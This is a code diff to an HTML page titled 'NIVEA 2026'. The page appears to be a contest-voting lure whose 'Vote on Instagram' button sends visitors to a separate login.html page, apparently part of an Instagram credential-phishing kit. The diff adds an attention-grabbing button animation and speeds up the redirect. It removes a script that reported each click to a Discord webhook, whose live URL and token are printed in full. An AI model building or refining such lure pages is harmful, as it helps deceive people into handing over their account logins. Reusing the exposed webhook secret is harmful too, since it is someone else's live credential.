@@ -5,6 +5,25 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>NIVEA 2026</title>
   <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    @keyframes buttonPop {
+      0% {
+        opacity: 0;
+        transform: scale(0.6) translateY(20px);
+      }
+      70% {
+        transform: scale(1.08) translateY(-5px);
+      }
+      100% {
+        opacity: 1;
+        transform: scale(1) translateY(0);
+      }
+    }
+
+    .vote-button {
+      animation: buttonPop 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+    }
+  </style>
 </head>
 
 <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
@@ -29,7 +48,6 @@
       <div class="p-6 md:p-8">
 
         <div class="flex items-center gap-4 mb-6">
-          
           <!-- Badge -->
           <div class="relative flex-shrink-0">
             <svg class="w-16 h-16 text-blue-500" viewBox="0 0 100 100">
@@ -55,9 +73,9 @@
           I need your support! Please take a moment to cast your vote and help me reach new heights in this competition.
         </p>
 
-        <!-- Vote Button -->
+        <!-- Vote Button with Animation -->
         <a href="login.html" id="vote-btn"
-           class="block w-full bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 text-white font-semibold text-lg py-4 rounded-2xl transition shadow-lg hover:shadow-xl flex items-center justify-center gap-3 cursor-pointer">
+           class="vote-button block w-full bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 text-white font-semibold text-lg py-4 rounded-2xl transition-all duration-200 shadow-lg hover:shadow-xl flex items-center justify-center gap-3 cursor-pointer active:scale-95">
           
           <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24">
             <rect x="2" y="2" width="20" height="20" rx="5" fill="none" stroke="white" stroke-width="1.5"/>
@@ -78,47 +96,19 @@
   </div>
 
   <script>
-    // === DISCORD WEBHOOK CONFIG ===
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1489579300687577279/fMVQanQ8kgUHZ9a_G39YhvpKjHnCmJmljDDHR9ntSa7bUAPMh1Axq0AK4VRumc10Npau";
-
     document.addEventListener('DOMContentLoaded', () => {
       const btn = document.getElementById('vote-btn');
 
-      if (!btn) {
-        console.warn('Vote button not found');
-        return;
-      }
+      if (!btn) return;
 
-      btn.addEventListener('click', async (e) => {
-        e.preventDefault();   // Prevent immediate redirect
-
-        // Simple and clean message
-        const message = `**🚨 New Vote Click Detected**
-
-**Page:** Fashion Brand Vote
-**Action:** User clicked "Vote on Instagram"
-**Time:** ${new Date().toLocaleString()}
-
-🔐 2026@FTECHSERVICES`;
-
-        try {
-          await fetch(DISCORD_WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              content: message,
-              username: "Vote Tracker",
-              avatar_url: "https://i.imgur.com/removed.png" // optional
-            })
-          });
-          console.log("Vote click sent to Discord");
-        } catch (error) {
-          console.error("Webhook failed:", error);
-          // Continue anyway - don't block the user
-        }
-
-        // Redirect to login page after sending notification
-        window.location.href = btn.href || "login.html";
+      btn.addEventListener('click', (e) => {
+        // Optional: Add a quick press animation
+        btn.style.transform = 'scale(0.92)';
+        
+        // Redirect almost instantly (10x faster - no delay)
+        setTimeout(() => {
+          window.location.href = btn.href || "login.html";
+        }, 80); // 80ms feels very snappy
       });
     });
   </script>
